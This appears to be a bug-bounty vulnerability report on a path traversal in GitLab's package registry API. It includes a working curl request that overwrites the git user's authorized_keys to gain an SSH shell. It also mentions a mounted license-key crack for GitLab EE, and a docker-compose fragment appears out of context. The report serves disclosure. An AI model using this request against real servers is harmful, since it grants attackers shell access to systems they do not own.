# Path traversal, to RCE

## Original Report

### Summary
This one is similar to #732330 but much simpler.
A path traversal issue in GitLab package registry API allow an attacker to write any file at any location writable to user git in a GitLab server.

### Steps to reproduce

1. Enable package registry in your GitLab instance.
2. Create a project (package registry is enabled by default)
3. Create a private token to call the API
4. Send the following request

```
curl -H "Private-Token: $(cat token)" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
```
Then run `ssh git@10.26.0.5` to enjoy a shell.

### Examples

{F630231}

In my setup, I did't expose the 22 port of GitLab docker container, so I logged in the server with its docker IP, 172.18.0.2. In case there's any misunderstandings.

      - './data:/var/opt/gitlab'
      - ./crack/pub.pem:/opt/gitlab/embedded/service/gitlab-rails/.license_encryption_key.pub:ro
```
Please forgive me to use a crack on my self hosted testing purpose GitLab EE instance :)

## Impact

This path traversal issue could be easily exploited by overwriting some critical files related to server access. In my example I use authorized_keys of git user to enable the shell access for the attacker.
